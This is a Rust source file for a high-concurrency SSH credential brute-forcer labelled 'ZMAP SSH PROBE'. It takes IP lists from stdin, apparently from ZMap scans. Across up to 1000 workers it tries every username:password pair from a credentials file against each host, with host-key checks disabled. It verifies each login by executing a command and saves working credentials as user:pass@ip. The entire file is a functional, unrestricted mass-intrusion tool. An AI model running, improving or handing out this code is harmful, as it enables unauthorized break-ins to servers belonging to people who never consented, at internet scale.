use clap::Parser;
use colored::*;
use std::fs::OpenOptions;
use std::io::{self, BufRead, BufWriter, Write};
use std::sync::atomic::{AtomicUsize, Ordering};
use tokio::sync::Mutex;
use std::sync::Arc;
use std::time::Duration;
use async_ssh2_tokio::client::{Client, AuthMethod, ServerCheckMethod};
use std::panic::AssertUnwindSafe;
use tokio::io::AsyncBufReadExt;
use futures::FutureExt;
use tokio::time::timeout;

static IMPORTED: AtomicUsize = AtomicUsize::new(0);
static CHECKED: AtomicUsize = AtomicUsize::new(0);
static COMBOS_CHECKED: AtomicUsize = AtomicUsize::new(0);
static SUCCESS: AtomicUsize = AtomicUsize::new(0);
static FAILED: AtomicUsize = AtomicUsize::new(0);
static TIMEOUTS: AtomicUsize = AtomicUsize::new(0);
const CHANNEL_SIZE: usize = 50000;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Specifies the SSH port
    #[arg(short = 'p', long, default_value = "22")]
    port: u16,

    /// Specifies the name of the output file
    #[arg(short = 'o', long, default_value = "results.txt")]
    output_file: String,

    /// Specifies the number of workers to use per thread
    #[arg(short = 'w', long, default_value = "1000")]
    workers: usize,
}

// Hardcoded change to threads you want. 
//This will split your workers, example 1000 workers and 10 threads will be 100 workers per thread.
#[tokio::main(flavor = "multi_thread", worker_threads = 10)] 
async fn main() {
    let args = Args::parse();

    let (ip_tx, ip_rx) = tokio::sync::mpsc::channel(CHANNEL_SIZE);
    let ip_rx = Arc::new(Mutex::new(ip_rx)); 

    // Print stats
    tokio::task::spawn(async {
        println!("+-------------------------------------------+");
        println!("|             ZMAP SSH PROBE                |");
        println!("+-------------------------------------------+");

        loop {
            tokio::time::sleep(Duration::from_secs(1)).await; // Sleep for one second

            // Read the atomic values
            let imported_count = IMPORTED.load(Ordering::Relaxed);
            let checked_count = CHECKED.load(Ordering::Relaxed);
            let combos_checked_count = COMBOS_CHECKED.load(Ordering::Relaxed);
            let success_count = SUCCESS.load(Ordering::Relaxed);
            let failed_count = FAILED.load(Ordering::Relaxed);
            let timeouts_count = TIMEOUTS.load(Ordering::Relaxed);

            print!("IPs Imported: {} | IPs Checked: {} | Combos Checked: {} | Successful: {} | Failed: {} | Timeouts: {} \n", 
                imported_count.to_string().blue(),
                checked_count.to_string().blue(),
                combos_checked_count.to_string().yellow(),
                success_count.to_string().green(),
                failed_count.to_string().red(),
                timeouts_count.to_string().magenta()
            );

            io::stdout().flush().unwrap();
        }
    });

    // Reading from stdin
    let stdin_task = tokio::spawn(async move {
        let mut stdin = tokio::io::BufReader::new(tokio::io::stdin());

        let mut buffer = String::new();
        while stdin.read_line(&mut buffer).await.expect("Failed to read line") > 0 {
            ip_tx.send(buffer.trim().to_string()).await.expect("Failed to send IP");
            IMPORTED.fetch_add(1, Ordering::Relaxed);
            buffer.clear();
        }
    });

    let credentials = load_credentials_file("credentials.txt");

    // Spawning and joining tasks
    let tasks: Vec<_> = (0..args.workers).map(|_| {
        let ip_rx = ip_rx.clone();
        let creds = credentials.clone();
        let output_file = args.output_file.clone();

        tokio::spawn(async move {
            loop {
                let ip = {
                    let mut rx = ip_rx.lock().await;
                    match rx.recv().await {
                        Some(ip) => ip,
                        None => break,  // No more IPs to process
                    }
                };
                check_ssh_login(ip, args.port, creds.clone(), &output_file).await;
            }
        })
    }).collect();

    let _ = futures::future::join_all(tasks).await;
    stdin_task.await.expect("stdin_task panicked");
}

async fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str) {
    CHECKED.fetch_add(1, Ordering::Relaxed);

    for (username, password) in &credentials {
        let target = (ip.as_str(), port);

        let result = AssertUnwindSafe(check_single_credential(target, username, password, output_file, &ip))
            .catch_unwind()
            .await;

        if let Err(_) = result {
            //println!("Encountered an error while trying to connect to {}:{}. Treating as failed.", ip, port);
            FAILED.fetch_add(1, Ordering::Relaxed);
        }
    }
}

async fn check_single_credential(
    target: (&str, u16),
    username: &str,
    password: &str,
    output_file: &str,
    ip: &str,
) -> Result<(), ()> {
    let auth_method = AuthMethod::with_password(password);

    let connect_result = timeout(Duration::from_secs(5), Client::connect(target, username, auth_method, ServerCheckMethod::NoCheck)).await;
    
    COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);

    match connect_result {
        Ok(Ok(client)) => {
            match client.execute("echo .").await {
                Ok(result) => {
                    if result.exit_status == 0 {
                        SUCCESS.fetch_add(1, Ordering::Relaxed);
                        write_successful_login_to_file(output_file, ip, username, password).await;
                    } else {
                        FAILED.fetch_add(1, Ordering::Relaxed);
                    }
                },
                Err(_err) => {
                    //eprintln!("Error executing command on {}: {}", ip, err);
                    FAILED.fetch_add(1, Ordering::Relaxed);
                },
            }
        },
        Ok(Err(err)) if err.to_string().contains("timeout") => {
            //eprintln!("Connection to {} timed out", ip);
            TIMEOUTS.fetch_add(1, Ordering::Relaxed);
            return Err(());
        },
        Ok(Err(_err)) => {
            //eprintln!("Error connecting to {}: {}", ip, err);
            FAILED.fetch_add(1, Ordering::Relaxed);
            return Err(());
        },
        Err(_) => {
            //eprintln!("Connection to {} timed out", ip);
            TIMEOUTS.fetch_add(1, Ordering::Relaxed);
            return Err(());
        },
    }

    Ok(())
}

fn load_credentials_file(file_path: &str) -> Vec<(String, String)> {
    let file = std::fs::File::open(file_path).expect("Unable to open credentials file");
    let reader = std::io::BufReader::new(file);

    reader
        .lines()
        .filter_map(|line| {
            let line = line.expect("Failed to read line from credentials file");
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() == 2 {
                Some((parts[0].to_string(), parts[1].to_string()))
            } else {
                None
            }
        })
        .collect()
}

async fn write_successful_login_to_file(output_file: &str, ip: &str, username: &str, password: &str) {
    let file = OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open(output_file)
        .unwrap();
    let mut file = BufWriter::new(file);

    writeln!(file, "{}:{}@{}", username, password, ip).unwrap();
    file.flush().unwrap();
}
